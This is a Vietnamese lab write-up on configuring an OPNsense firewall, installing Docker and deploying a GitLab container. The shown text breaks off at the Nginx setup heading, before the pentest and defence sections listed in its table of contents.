# An toàn dịch vụ trên docker và các ứng dụng khác(gitlab) {#an-toàn-dịch-vụ-trên-docker-và-các-ứng-dụng-khácgitlab .unnumbered}

# Mục Lục {#mục-lục .TOC-Heading .unnumbered}

#  {#section .TOC-Heading .unnumbered}

[An toàn dịch vụ trên docker và các ứng dụng khác(gitlab)
[1](#an-toàn-dịch-vụ-trên-docker-và-các-ứng-dụng-khácgitlab)](#an-toàn-dịch-vụ-trên-docker-và-các-ứng-dụng-khácgitlab)

[Mục Lục [2](#mục-lục)](#mục-lục)

[I. Triển khai mô hình [4](#_Toc197592885)](#_Toc197592885)

[II. Cấu hình Firewall opnsense [4](#_Toc197592886)](#_Toc197592886)

[**1. Cấu hình NAT (Outbound NAT)**
[4](#cấu-hình-nat-outbound-nat)](#cấu-hình-nat-outbound-nat)

[**2. Cấu hình NAT Port Forwarding (nếu muốn từ client truy cập vào
Ubuntu Server)**
[5](#cấu-hình-nat-port-forwarding-nếu-muốn-từ-client-truy-cập-vào-ubuntu-server)](#cấu-hình-nat-port-forwarding-nếu-muốn-từ-client-truy-cập-vào-ubuntu-server)

[**3. Firewall Rules** [6](#firewall-rules)](#firewall-rules)

[**4.** **Kiểm tra** [7](#kiểm-tra)](#kiểm-tra)

[**5.** **Kích hoạt SSH** [8](#kích-hoạt-ssh)](#kích-hoạt-ssh)

[III. Cài đặt Nginx Reverse Proxy + GitLab Container
[10](#_Toc197592892)](#_Toc197592892)

[**3.1** **Dựng docker** [10](#dựng-docker)](#dựng-docker)

[**3.2** **Dựng Gitlab** [14](#dựng-gitlab)](#dựng-gitlab)

[**3.3** **Dựng Nginx** [26](#dựng-nginx)](#dựng-nginx)

[**3.4** **Cấu hình thông port để public dịch vụ ra ngoài**
[28](#cấu-hình-thông-port-để-public-dịch-vụ-ra-ngoài)](#cấu-hình-thông-port-để-public-dịch-vụ-ra-ngoài)

[IV. Pentest [30](#_Toc197592897)](#_Toc197592897)

[**4.1** **Tạo vul** [30](#tạo-vul)](#tạo-vul)

[4.2 Về vul [31](#về-vul)](#về-vul)

[4.3 Exploit vul [31](#exploit-vul)](#exploit-vul)

[4.4 Pen LAN [32](#pen-lan)](#pen-lan)

[4.4.1 Script [33](#script)](#script)

[4.4.2 Tổng quan script khai thác
[41](#tổng-quan-script-khai-thác)](#tổng-quan-script-khai-thác)

[4.4.3 Show key [42](#show-key)](#show-key)

[4.5 Pen WAN [46](#pen-wan)](#pen-wan)

[4.5.1 Show key [46](#_Toc197592906)](#_Toc197592906)

[4.6 Sự khác nhau [47](#sự-khác-nhau)](#sự-khác-nhau)

[**4.6.1** **Exploit qua Firewall (Từ ngoài vào mạng nội bộ)**
[47](#exploit-qua-firewall-từ-ngoài-vào-mạng-nội-bộ)](#exploit-qua-firewall-từ-ngoài-vào-mạng-nội-bộ)

[**4.6.2** **Exploit trong LAN (Trong cùng mạng nội bộ)**
[48](#exploit-trong-lan-trong-cùng-mạng-nội-bộ)](#exploit-trong-lan-trong-cùng-mạng-nội-bộ)

[4.6.3 Sumary [49](#sumary)](#sumary)

[4.7 Đề xuất biện pháp phòng thủ nội bộ và ngoại vi
[49](#đề-xuất-biện-pháp-phòng-thủ-nội-bộ-và-ngoại-vi)](#đề-xuất-biện-pháp-phòng-thủ-nội-bộ-và-ngoại-vi)

[4.7.1 Đề xuất biện pháp phòng thủ nội bộ
[49](#đề-xuất-biện-pháp-phòng-thủ-nội-bộ)](#đề-xuất-biện-pháp-phòng-thủ-nội-bộ)

[4.7.2 Đề xuất biện pháp phòng thủ ngoại vi
[52](#đề-xuất-biện-pháp-phòng-thủ-ngoại-vi)](#đề-xuất-biện-pháp-phòng-thủ-ngoại-vi)

[V. Triển khai **c‑icap** và **ClamAV** nhằm thực hiện **SSL
Inspection** phòng thủ đối với nội bộ
[60](#_Toc197592914)](#_Toc197592914)

[**Bước 1:** **Cài đặt các plugin**
[61](#cài-đặt-các-plugin)](#cài-đặt-các-plugin)

[**Bước 2:** **Tạo Certificate Authority (CA) cho SSL Bump**
[62](#tạo-certificate-authority-ca-cho-ssl-bump)](#tạo-certificate-authority-ca-cho-ssl-bump)

[**Bước 3:** **Cấu hình Squid làm Transparent Proxy và SSL Bump**
[63](#cấu-hình-squid-làm-transparent-proxy-và-ssl-bump)](#cấu-hình-squid-làm-transparent-proxy-và-ssl-bump)

[**Bước 4:** **Cấu hình ICAP (c‑icap)**
[69](#cấu-hình-icap-cicap)](#cấu-hình-icap-cicap)

[**Bước 5:** **Cấu hình ClamAV**
[70](#cấu-hình-clamav)](#cấu-hình-clamav)

[**Bước 6:** **Khởi động và kiểm tra**
[71](#khởi-động-và-kiểm-tra)](#khởi-động-và-kiểm-tra)

[**Bước 7:** **Lưu ý & Tối ưu** [74](#lưu-ý-tối-ưu)](#lưu-ý-tối-ưu)

[VI. Phương pháp phòng thủ đối với ngoại vi
[75](#_Toc197592922)](#_Toc197592922)

[**6.1** **Bật IDS/IPS với Suricata**
[75](#_Toc197592923)](#_Toc197592923)

[**6.2** **Cấu hình Firewall Rule cho WAN**
[80](#_Toc197592924)](#_Toc197592924)

[**6.3** **Sử dụng Reverse Proxy (HAProxy/NGINX) để lọc traffic vào**
[80](#_Toc197592925)](#_Toc197592925)

[**6.4** **Giám sát và phân tích log real-time**
[80](#_Toc197592926)](#_Toc197592926)

[**6.5** **Chặn IP/mạng nguy hiểm (Reputation Filtering)**
[80](#_Toc197592927)](#_Toc197592927)

[**6.5.1** **Cài đặt plugin CrowdSec**
[81](#cài-đặt-plugin-crowdsec)](#cài-đặt-plugin-crowdsec)

[**6.5.2** **Cấu hình dịch vụ CrowdSec**
[81](#cấu-hình-dịch-vụ-crowdsec)](#cấu-hình-dịch-vụ-crowdsec)

[**6.5.3** **Xem luật và alias do CrowdSec sinh tự động**
[82](#xem-luật-và-alias-do-crowdsec-sinh-tự-động)](#xem-luật-và-alias-do-crowdsec-sinh-tự-động)

[**6.5.4** **Thêm luật Firewall chặn outbound IP độc hại**
[83](#thêm-luật-firewall-chặn-outbound-ip-độc-hại)](#thêm-luật-firewall-chặn-outbound-ip-độc-hại)

[**6.5.5** **Tạo tài khoản quản lý trên CrowdSec Console (tuỳ chọn)**
[85](#tạo-tài-khoản-quản-lý-trên-crowdsec-console-tuỳ-chọn)](#tạo-tài-khoản-quản-lý-trên-crowdsec-console-tuỳ-chọn)

[**6.5.6** **Thêm Private IP vào whitelist**
[88](#thêm-private-ip-vào-whitelist)](#thêm-private-ip-vào-whitelist)

[**6.5.7** **Bổ sung Additional Blocklists từ CrowdSec Hub**
[90](#bổ-sung-additional-blocklists-từ-crowdsec-hub)](#bổ-sung-additional-blocklists-từ-crowdsec-hub)

[**6.5.8** **Kiểm thử hoạt động**
[91](#kiểm-thử-hoạt-động)](#kiểm-thử-hoạt-động)

[VII. Tài liệu tham khảo [93](#_Toc197592936)](#_Toc197592936)

I.  []{#_Toc197592885 .anchor}Triển khai mô hình

![](media/image1.png){width="3.401175634295713in"
height="2.8859120734908137in"}

Hệ thống lab OPNsense với sơ đồ như sau:

- **Client**: 192.168.160.10

- **OPNsense firewall**:

  - WAN: 192.168.160.131

  - LAN: 192.168.1.20

- **Ubuntu Server**: 192.168.1.30

Set IP gateway cho cả 3 máy phù hợp,

II. []{#_Toc197592886 .anchor}Cấu hình Firewall opnsense

Tiếp theo **cấu hình NAT và Rules** trong OPNsense để:

1.  Client từ 192.168.160.10 có thể truy cập Ubuntu Server
    (192.168.1.30)

2.  Ubuntu Server có thể reply về client

3.  Có thể kiểm tra/ping nhau xuyên qua firewall

### **1. Cấu hình NAT (Outbound NAT)** {#cấu-hình-nat-outbound-nat .unnumbered}

Vào Firewall \> NAT \> Outbound

- Chọn chế độ: **Hybrid Outbound NAT rule generation**

- Bấm **Save** và **Apply changes**

![](media/image2.png){width="6.5in" height="1.4708333333333334in"}

- Sau đó, thêm rule mới:

![](media/image3.png){width="6.5in" height="0.9486111111111111in"}

| **Field**            | **Value**                    |
|----------------------|------------------------------|
| Interface            | LAN                          |
| Source               | 192.168.1.0/24               |
| Translation / target | Interface Address (mặc định) |

Rule này để Ubuntu Server truy cập ra ngoài (gửi về client qua OPNsense
WAN)

![](media/image4.png){width="6.5in" height="0.7820516185476816in"}

### **2. Cấu hình NAT Port Forwarding (nếu muốn từ client truy cập vào Ubuntu Server)** {#cấu-hình-nat-port-forwarding-nếu-muốn-từ-client-truy-cập-vào-ubuntu-server .unnumbered}

Vào Firewall \> NAT \> Port Forward

Ví dụ: muốn từ client (192.168.160.10) truy cập **SSH (port 22)** vào
Ubuntu Server:

- Interface: **WAN**

- Protocol: **TCP**

- Destination: **WAN Address**

- Destination port range: 22

- Redirect target IP: 192.168.1.30

- Redirect target port: 22

- Description: NAT SSH to Ubuntu Server

- Bấm **Save**, rồi **Apply changes**

![](media/image5.png){width="6.5in" height="0.17916666666666667in"}

📌 Bạn có thể lặp lại bước này cho các port khác (HTTP, HTTPS, v.v.)

![](media/image6.png){width="6.5in" height="0.43333333333333335in"}

### **3. Firewall Rules** {#firewall-rules .unnumbered}

Vào Firewall \> Rules \> WAN

- Add rule cho phép lưu lượng vào (liên quan đến NAT port forward):

| **Field**              | **Value**                  |
|------------------------|----------------------------|
| Action                 | Pass                       |
| Interface              | WAN                        |
| Protocol               | TCP                        |
| Source                 | 192.168.160.10 hoặc any    |
| Destination            | WAN address                |
| Destination port range | 22                         |
| Description            | Allow SSH to Ubuntu Server |

Tương tự với HTTP và HTTPS

![](media/image7.png){width="6.5in" height="2.7715277777777776in"}

Vào Firewall \> Rules \> LAN

- Add rule để **cho phép traffic từ LAN ra ngoài** (đi qua NAT):

| **Field**   | **Value**               |
|-------------|-------------------------|
| Action      | Pass                    |
| Protocol    | any                     |
| Source      | LAN net                 |
| Destination | any                     |
| Description | Allow LAN to access WAN |

![](media/image8.png){width="6.5in" height="2.3027777777777776in"}

### **Kiểm tra**

Từ client 192.168.160.10, bạn thử:

ping 192.168.1.30

ssh <ubuntu@192.168.1.30> \# nếu có NAT port forward SSH

![](media/image9.png){width="6.5in" height="3.598611111111111in"}

Từ Ubuntu Server:

ping 8.8.8.8 \# Kiểm tra internet (qua NAT)

ping 192.168.160.10 \# Nếu cần, kiểm tra định tuyến

![](media/image10.png){width="6.5in" height="2.834722222222222in"}

### **Kích hoạt SSH**

Để truy cập SSH vào OPNsense, cần thực hiện các bước sau:

**Bước 1: Kích hoạt SSH trên OPNsense**

1.  **Đăng nhập vào giao diện web của OPNsense.**

2.  **Điều hướng đến:** System → Settings → Administration.

3.  **Tìm phần \"Secure Shell\" và thực hiện:**

    - **✔️ Enable Secure Shell**: Bật dịch vụ SSH.

    - **✔️ Permit root user login**: Cho phép đăng nhập bằng tài khoản
      root (nếu cần).

    - **✔️ Permit password login**: Cho phép đăng nhập bằng mật khẩu
      (nếu không sử dụng SSH key).

    - **Listen Interfaces**: Chọn giao diện mạng mà bạn muốn SSH lắng
      nghe (ví dụ: LAN). Nếu để trống, SSH sẽ lắng nghe trên tất cả các
      giao diện.

![](media/image11.png){width="6.5in" height="2.1326388888888888in"}

4.  **Nhấn \"Save\" để lưu cài đặt.**

**Lưu ý:** Nếu bạn sử dụng SSH key để xác thực, hãy đảm bảo đã thêm
public key vào tài khoản người dùng tương ứng trong System → Access →
User.

**Bước 2: Mở cổng SSH trên tường lửa (nếu cần)**

Mặc định, OPNsense cho phép truy cập SSH từ mạng LAN. Tuy nhiên, nếu bạn
muốn truy cập từ các mạng khác (ví dụ: WAN hoặc OPT1), bạn cần tạo một
quy tắc tường lửa:

1.  **Điều hướng đến:** Firewall → Rules → \[Tên giao diện mạng\] (ví
    dụ: WAN).

2.  **Nhấn \"Add\" để tạo quy tắc mới với các thông số:**

    - **Action**: Pass

    - **Interface**: \[Tên giao diện mạng\] (ví dụ: WAN)

    - **Protocol**: TCP

    - **Source**: any

    - **Destination**: This Firewall

    - **Destination port range**: SSH (22) hoặc cổng tùy chỉnh bạn đã
      cấu hình.

3.  **Nhấn \"Save\" và sau đó \"Apply Changes\" để áp dụng quy tắc.**

**Cảnh báo:** Mở cổng SSH trên giao diện WAN có thể tiềm ẩn rủi ro bảo
mật. Hãy đảm bảo sử dụng xác thực bằng SSH key và xem xét sử dụng cổng
không chuẩn để giảm thiểu nguy cơ bị tấn công.

**Bước 3: Kết nối SSH từ máy khách**

Từ máy tính của bạn, sử dụng terminal hoặc ứng dụng SSH (như PuTTY) để
kết nối:

ssh \[email protected\]

Thay 192.168.1.1 bằng địa chỉ IP của OPNsense và root bằng tên người
dùng bạn muốn đăng nhập.

**Lưu ý:** Nếu bạn đã cấu hình xác thực bằng SSH key, hãy sử dụng tùy
chọn -i để chỉ định đường dẫn đến private key của bạn:

ssh -i /path/to/private_key \[email protected\]

III. []{#_Toc197592892 .anchor}Cài đặt Nginx Reverse Proxy + GitLab
     Container

## **Dựng docker**

> **Bước 1: Cài đặt Docker**

- Cập nhật package source của hệ thống:

> sudo apt update

- Cài đặt một số gói cần thiết nhằm giúp apt có thể sử dụng package qua
  > HTTPS:

> sudo apt install apt-transport-https ca-certificates curl
> software-properties-common
>
> ![](media/image12.png){width="6.5in" height="2.192361111111111in"}

- Thêm mới GPG Key của Docker:

> curl -fsSL https://download.docker.com/linux/ubuntu/gpg \| sudo
> apt-key add -
>
> ![](media/image13.png){width="6.5in" height="0.20833333333333334in"}

- Thêm mới Docker Repository vào APT:

> sudo add-apt-repository \"deb \[arch=amd64\]
> https://download.docker.com/linux/ubuntu focal stable\"
>
> ![](media/image14.png){width="6.5in" height="0.875in"}
>
> Bước này sẽ cũng thêm mới các Repo vào package database của hệ thống.

- Kiểm tra xem việc thay thế repo mới nhất với repo mặc định của hệ
  > thông xem đã được thay thế chưa

> apt-cache policy docker-ce
>
> Kết quả trả về sẽ như sau, phiên bản Docker có thể thay đổi tùy vào
> thời điểm cài đặt:
>
> ![](media/image15.png){width="6.5in" height="1.0020833333333334in"}
>
> Trong output trên, lưu ý rằng docker-ce chưa được cài đặt, nhưng đã có
> sẵn phiên bản 5:19.03.9\~3-0\~ubuntu-focal trong repo sẵn sàng để cài
> đặt.

- Cài đặt Docker:

> sudo apt install docker-ce
>
> ![](media/image16.png){width="6.5in" height="3.9569444444444444in"}
>
> Sau bước này, Docker sẽ được cài đặt, deamon sẽ được khởi động (Docker
> Service chạy ngầm) và process sẽ được thêm vào boot (khởi động cùng hệ
> thống). Để kiểm tra xem Docker Deamon đã được khởi động hay chưa,
> chúng ta sử dụng lệnh sau:
>
> sudo systemctl status docker
>
> Service khi hoạt động bình thường sẽ trả về kết quả như sau:
>
> ![](media/image17.png){width="6.5in" height="3.3270833333333334in"}
>
> Trong trường hợp có lỗi xảy ra, giá trị Active sẽ là failed. Đối với
> các bản cài Docker hiện nay, gói cài đặt thường không chỉ bao gồm mỗi
> Docker Service (Deamon) mà sẽ bao gồm các tiện ích khác như Docker
> Command Line hoặc Docker Client để chúng ta có thể tương tác với
> Docker Service thông qua CLI. Trong các phần sau chúng ta sẽ tìm hiểu
> về cách sử dụng Docker Command Line để tương tác với Docker Service.
>
> Để xác minh cài đặt docker, hãy chạy lệnh docker \hello-world\\ bên
> dưới.
>
> docker run hello-world
>
> Lúc này bạn sẽ nhận được thông báo \hello-world\\ từ docker như bên
> dưới.
>
> ![](media/image18.png){width="6.5in" height="3.7305555555555556in"}
>
> Bây giờ đã sẵn sàng để cài đặt GitLab bằng docker container và
> docker-compose.
>
> Trước khi cài đặt Gitlab, chúng tôi cần cài đặt một số gói nhất định
> cần thiết trong quá trình hướng dẫn.
>
> sudo apt install ca-certificates curl openssh-server
> apt-transport-https gnupg lsb-release -y
>
> Một số gói này có thể đã được cài đặt sẵn trên hệ thống của bạn.
>
> Gitlab use default SSH port sẽ xung đột với port SSH của hệ thống. Để
> có kết quả tốt nhất, tốt hơn là thay đổi cổng mặc định của hệ thống.
>
> Để thực hiện công việc này, hãy mở   /etc/ssh/sshd_config tệp để chỉnh
> sửa.
>
> sudo gedit /etc/ssh/sshd_config
>
> Tìm dòng sau, xóa dấu thăng (#) ở phía trước và thay đổi giá trị từ 22
> thành bất kỳ giá trị nào bạn chọn. Đối với hướng dẫn của tôi, tôi đã
> chọn 2425 bằng cách thay đổi
>
> Lưu tệp
>
> Khởi động lại SSH service.
>
> sudo systemctl restart sshd

## **Dựng Gitlab**

> Tạo Docker ổ đĩa thư mục.
>
> sudo mkdir /srv/gitlab -p
>
> Tạo một thư mục cho Docker file editor.
>
> mkdir \~/gitlab-docker
>
> Chuyển sang thư mục.
>
> cd \~/gitlab-docker
>
> Tạo một môi trường biến tệp và mở nó để chỉnh sửa.
>
> gedit .env
>
> GITLAB_HOME=/srv/gitlab
>
> Bộ chứa Gitlab sử dụng các ổ đĩa được gắn trên máy chủ để lưu trữ liên
> tục dữ liệu. Bảng sau đây hiển thị bộ định vị cục bộ của các Gitlab
> thư mục đến vị trí của các bộ chứa và cách sử dụng ứng dụng tương
> thích của chúng.

| \$GITLAB_HOME/dữ liệu  | /var/opt/gitlab | Để lưu trữ ứng dụng dữ liệu. |
|------------------------|-----------------|------------------------------|
| \$GITLAB_HOME/nhật ký  | /var/log/gitlab | Để lưu trữ nhật ký.          |
| \$GITLAB_HOME/cấu hình | /etc/gitlab     | Để lưu trữ cấu hình Gitlab.  |

> **Cài đặt Gitlab bằng Docker Compose**
>
> Đảm bảo rằng bạn đang ở trong thư mục Docker soạn của Gitlab.
>
> Tạo và mở Docker cấu hình tệp để chỉnh sửa chỉnh sửa.
>
> sudo gedit docker-compose.yml
>
> version: \'3.6\'
>
> services:
>
> web:
>
> image: \'gitlab/gitlab-ee:latest\'
>
> container_name: \'gitlab-congdonglinux\'
>
> restart: always
>
> hostname: \'gitlab.example.com\'
>
> environment:
>
> GITLAB_OMNIBUS_CONFIG: \|
>
> external_url \'https://gitlab.example.com\'
>
> nginx\[\'ssl_certificate\'\] =
> \"/etc/gitlab/ssl/gitlab.example.com.crt\"
>
> nginx\[\'ssl_certificate_key\'\] =
> \"/etc/gitlab/ssl/gitlab.example.com.key\"
>
> gitlab_rails\[\'smtp_enable\'\] = true
>
> gitlab_rails\[\'smtp_address\'\] =
> \"email-smtp.us-west-2.amazonaws.com\"
>
> gitlab_rails\[\'smtp_user_name\'\] = \"SESUsername\"
>
> gitlab_rails\[\'smtp_password\'\] = \"SESKey\"
>
> gitlab_rails\[\'smtp_domain\'\] = \"example.com\"
>
> gitlab_rails\[\'smtp_enable_starttls_auto\'\] = true
>
> gitlab_rails\[\'smtp_port\'\] = 587
>
> gitlab_rails\[\'smtp_authentication\'\] = \"login\"
>
> gitlab_rails\[\'gitlab_email_from\'\] = \'gitlab@example.com\'
>
> gitlab_rails\[\'gitlab_email_reply_to\'\] = \'noreply@example.com\'
>
> ports:
>
> \- \'8080:80\'
>
> \- \'8443:443\'
>
> \- \'2222:22\'
>
> \- \'5878:587\'
>
> volumes:
>
> \- \'\${GITLAB_HOME}/config:/etc/gitlab\'
>
> \- \'\${GITLAB_HOME}/logs:/var/log/gitlab\'
>
> \- \'\${GITLAB_HOME}/data:/var/opt/gitlab\'
>
> \- \'/root/gitlab/ssl:/etc/gitlab/ssl\'
>
> shm_size: \'256m\'
>
> Chúng ta hãy xem xét tất cả các tùy chọn được xác định trong tệp.

- **hình ảnh**   đề cập đến vị trí hình ảnh Docker của Gitlab trên
  > Dockerhub.

- **container_name**   cho phép bạn áp dụng nhãn cho vùng chứa docker
  > của mình để sử dụng khi tham chiếu đến vùng chứa trong Docker mạng.

- **khởi động lại**   chính sách khởi động lại chỉ định cho vùng chứa.
  > Đặt   thành vùng chứa **luôn**   có nghĩa nếu thoát sẽ tự động khởi
  > động lại.

- **tên máy chủ**   xác định tên nội bộ máy chủ của vùng chứa hoặc trong
  > trường hợp này là URL nơi Gitlab của bạn sẽ được cài đặt.

- **môi trường**   cung cấp biến   **GITLAB_OMNIBUS_CONFIG**   cho phép
  > bạn nhập bất kỳ cấu hình Gitlab cài đặt nào.

- **external_url**   là miền tên nơi Gitlab của bạn sẽ được cài đặt. Sử
  > dụng   https giao thức SSL Let\'s Encrypt chỉ cài đặt tự động bảo
  > mật.

- **Chi tiết SMTP**   -- chúng tôi đã bao gồm chi tiết SMTP để phiên bản
  > Gitlab có thể gửi email và thông báo quan trọng. Đối với hướng dẫn
  > của chúng tôi, chúng tôi đang sử dụng dịch vụ SES của Amazon. Tuy
  > nhiên, bạn có thể sử dụng bất kỳ dịch vụ nào bạn chọn. Kiểm tra  
  > [tài liệu Gitlab dành riêng cho thư gửi
  > SMTP](https://docs.gitlab.com/omnibus/settings/smtp.html)   để tìm
  > hiểu cách cấu hình chúng.

-   ports security container xuất bản các **cổng** hoặc một loạt cổng
  > tới máy chủ. Vì Gitlab cần các cổng 22(SSH), 80(HTTP), 443(HTTPS) và
  > 587(SMTP), nên chúng đã được đưa ra hệ thống. Nếu bạn muốn Gitlab sử
  > dụng một cổng không chuẩn trên máy chủ của mình (có thể vì nó không
  > khả dụng), trước tiên bạn sẽ cung cấp cổng máy chủ và mới đến cổng
  > container. Ví dụ, vì máy chủ của bạn đã sử dụng cổng SSH(22), nên
  > bạn có thể bảo đảm Gitlab sử dụng SSH qua một cổng khác, ví dụ
  > như 3333. Sau đó, bạn sẽ thay đổi   **22:22**   trong tệp thành  
  > **3333:22**  . Bạn cũng cần thêm dòng  
  > gitlab_rails\[\'gitlab_shell_ssh_port\'\] = 3333 bên dưới  
  > **GITLAB_OMNIBUS_CONFIG**   ở trên.

- **Volume**   xác định các thư mục có trên máy chủ để lưu trữ liên tục
  > dữ liệu. Như đã xác định ở bước 5,   \$GITLAB_HOME giờ đây có thể
  > được sử dụng trong soạn thảo tệp để gắn các thư mục có liên quan vào
  > vùng chứa.

- **shm_size**   đề cập đến bộ nhớ dùng chung được sử dụng trong vùng
  > chứa. Theo mặc định, Docker phân tích bổ sung 64MB cho chung bộ nhớ
  > thư mục (có thể gắn tại   /dev/shm). Điều này có thể được chứng minh
  > là không đủ cho Prometheus số liệu mà Gitlab tạo ra. Do đó, mức sử
  > dụng bộ nhớ tối thiểu là 256MB docker run run chắc chắn. Bạn có thể
  > tăng giá trị của nó tùy thuộc vào RAM mà hệ thống của bạn có. Ngoài
  > ra, bạn có thể tắt Prometheus số liệu khỏi quản trị khu vực sau khi
  > cài đặt. Chúng ta sẽ khám phá điều này trong bước tiếp theo.

> Khởi động vùng chứa Gitlab Docker.
>
> sudo docker compose up -d
>
> Quá trình này sẽ mất vài phút để hoàn tất. Bạn có thể theo dõi tiến
> trình bằng cách sử dụng Docker cập nhật.
>
> docker logs gitlab-congdonglinux -f
>
> Nhấn   **Ctrl + C**   để thoát khỏi nhật ký theo dõi.
>
> Bạn có thể kiểm tra trạng thái của container Gitlab bằng lệnh sau.
>
> sudo docker ps
>
> Bắt đầu từ Gitlab 14.0, nó tự động tạo mật khẩu gốc và lưu trữ trong  
> initiall_root_password tệp. Có thể tìm thấy tệp này trong  
> /srv/gitlab/config thư mục. Chạy lệnh sau để xem gốc mật khẩu.
>
> sudo cat /srv/gitlab/config/initial_root_password
>
> Bạn sẽ nhận được kết quả tương tự.
>
> \# WARNING: This value is valid only in the following conditions
>
> \# 1. If provided manually (either via \`GITLAB_ROOT_PASSWORD\`
> environment variable or via
> \`gitlab_rails\[\'initial_root_password\'\]\` setting in
> \`gitlab.rb\`, it was provided before database was seeded for the
> first time (usually, the first reconfigure run).
>
> \# 2. Password hasn\'t been changed manually, either via UI or via
> command line.
>
> \#
>
> \# If the password shown here doesn\'t work, you must reset the admin
> password following
> https://docs.gitlab.com/ee/security/reset_user_password.html#reset-your-root-password.
>
> Password: j/74gbo4dHdFcexs0k9ts14ME+yL9JCRFDiMp0QN0yQ=
>
> \# NOTE: This file will be automatically deleted in the first
> reconfigure run after 24 hours.  
> Sao chép mật khẩu và lưu lại để sử dụng sau. Bây giờ mọi thứ đã được
> thiết lập, chúng tôi có thể tiến hành cấu hình.
>
> **Cấu hình Gitlab**
>
> **Truy cập Gitlab**
>
> Mở URL   https://gitlab.example.com trong trình duyệt của bạn và bạn
> sẽ nhận được màn hình đăng nhập sau đó.
>
> Nhập   root tên người dùng và mật khẩu mà bạn đã lấy ở bước trước để
> đăng nhập vào bảng điều khiển Gitlab của bạn. Khi đăng nhập, bạn sẽ
> được đưa vào bảng điều khiển màn hình sau.
>
> Giao diện sau khi đăng nhập  
> ![](media/image19.png){width="6.5in" height="3.6354166666666665in"}
>
> **Khai báo đăng ký chế độ**
>
> Theo mặc định, bất kỳ ai cũng có thể tạo tài khoản và có quyền truy
> cập. Nếu bạn không muốn, bạn có thể tắt nó đi. May mắn thay, cài đặt
> cho nó được hiển thị dưới dạng màn hình bật lên trên bảng điều khiển.
> Nhấn nút  **Tắt**   để hạn chế đăng ký công khai trên phiên bản Gitlab
> của bạn. Làm như vậy sẽ chuyển hướng bạn đến trang cài đặt sau.
>
> Bỏ chọn tùy chọn   **Đăng ký được bật**   để hạn chế chế độ của chúng.
> Nhấn nút   **Lưu thay đổi**   để áp dụng cài đặt.
>
> Trong trường hợp bạn không tìm thấy cửa sổ bật lên trên bảng điều
> khiển, bạn có thể truy cập trang cài đặt bằng cách nhấp vào nút 
> **Menu**   và truy cập bảng quản trị từ đó.
>
> ![](media/image20.png){width="6.5in" height="1.8041666666666667in"}
>
> ![](media/image21.png){width="6.5in" height="4.172916666666667in"}
>
> ![](media/image22.png){width="6.5in" height="3.484027777777778in"}
>
> Khi đã vào bảng quản trị, hãy nhấp chuột qua tùy chọn  **Cài đặt**   ở
> thanh bên trái và nhấp vào menu  **phụ**   . Từ đó, bạn có thể truy
> cập vào bảng  **đăng ký**   .
>
> ![](media/image23.png){width="2.7608016185476814in"
> height="8.15738845144357in"}
>
> Bạn sẽ được đưa đến trang Cài đặt hồ sơ, tại đó bạn có thể thêm tên,
> email và các thông tin khác về bản thân. Bước vào   **Cập nhật sơ đồ
> cài đặt**   khi bạn hoàn tất. Đừng quay lại trang chủ vì chúng tôi còn
> một số thứ khác cần cấu hình ở đây.
>
> ![](media/image24.png){width="2.6774573490813647in"
> height="3.240034995625547in"}
>
> **Đổi mật khẩu gốc**
>
> Đây là một trong những bước quan trọng nhất. Bạn nên thay đổi mặc định
> mật khẩu gốc ngay lập tức. Với các phiên bản trước, Gitlab yêu cầu bạn
> phải thay đổi mật khẩu như một phần của quá trình cài đặt nhưng giờ
> đây nó đã trở thành tùy chọn. Để thay đổi mật khẩu, hãy nhấp vào menu 
> **Mật khẩu**   từ thanh bên trái.
>
> ![](media/image25.png){width="6.5in" height="5.589583333333334in"}
>
> Nhập mật khẩu thông tin của bạn và nhấp vào   **Lưu mật khẩu**   để
> thực hiện thay đổi. Bạn sẽ được đăng nhập từ phiên bản của mình và
> phải đăng nhập lại.
>
> Sau đó văng ra và nhập lại pass vừa đổi
>
> ![](media/image26.png){width="6.280372922134733in"
> height="3.866855861767279in"}
>
> Khi vào trang, nhập tên người dùng mới của bạn và nhấp vào nút  **Cập
> nhật tên người dùng**   để thực hiện thay đổi. Bạn sẽ được xác nhận
> lần nữa. Nhấn nút  **Cập nhật tên người dùng**   một lần nữa để xác
> nhận các thay đổi.
>
> Bạn cũng nên bật xác thực hai yếu tố tại đây để cải thiện tính bảo mật
> tài khoản của mình.
>
> ![](media/image27.png){width="6.5in" height="3.629166666666667in"}
>
> Tạo tài khoản user
>
> ![](media/image28.png){width="6.5in" height="3.6118055555555557in"}
>
> ✅ User này sẽ chỉ có quyền user bình thường, phải được mời vào
> Project mới làm việc được.
>
> **🔥 Giải thích từng phần khi Tạo New User:**
>
> **1. Account (Tài khoản cơ bản)**

- **Name**: Tên hiển thị (ví dụ: *Đẹp Trai*).

- **Username**: Tên đăng nhập (ví dụ: *deptrai*).

- **Email**: Email để kích hoạt, reset password.

- **Password**:

  - Nếu **nhập** mật khẩu: User dùng mật khẩu đó để login.

  - Nếu **bỏ trống**: GitLab sẽ tự tạo một **link reset password** gửi
    > vào Email user → yêu cầu họ tự đặt mật khẩu lần đầu tiên.

> **2. Access (Quyền truy cập)**

- **Projects limit**:  
  > Giới hạn số lượng project người dùng này được tự tạo. (Mặc định:
  > 10000).  
  > → Bạn có thể giới hạn (ví dụ: chỉ cho tạo tối đa 5 project).

- **Can create top-level group**:

  - **Bật**: User này có quyền tạo Group cấp cao nhất (có thể quản lý
    > nhiều Project trong Group).

  - **Tắt**: Chỉ có thể join Group có sẵn, không được tự tạo Group lớn.

- **Private profile**:

  - Bật cái này: User đó chỉ hiển thị thông tin với những người họ chia
    > sẻ dự án chung → tránh lộ thông tin user.

- **Access level** (Rất quan trọng): 3 mức:

| **Access Level** | **Giải thích**          | **Khi nào dùng**                                                             |
|------------------|-------------------------|------------------------------------------------------------------------------|
| Regular          | Người dùng bình thường. | Dùng cho nhân viên, sinh viên\... làm việc bình thường.                      |
| Administrator    | Admin toàn quyền        | Bạn dùng cho root hoặc ai bạn muốn trao quyền admin cao nhất.                |
| External         | User bên ngoài          | Dùng cho cộng tác viên, freelancer. Hạn chế quyền, chỉ vào project được mời. |

- **Validate user account**:

  - Nếu GitLab bạn bật **CI/CD Runner** Free → yêu cầu user phải xác
    > thực thẻ tín dụng mới chạy được.

  - Nếu không quan tâm CI/CD thì bỏ qua.

  - (Bạn cũng có thể **Admin validate** cho user thủ công nếu cần.)

> Nghiên cứu sau
>
> **3. Profile (Thông tin cá nhân thêm)**

- **Avatar**: Ảnh đại diện.

- **Skype, Linkedin, X (Twitter), Website URL**:  
  > Thông tin mạng xã hội, không bắt buộc.

- **Admin notes**:  
  > Ghi chú nội bộ cho Admin (không ai khác thấy), ví dụ: \"Đẹp Trai -
  > Dev Backend\".

## **Dựng Nginx**

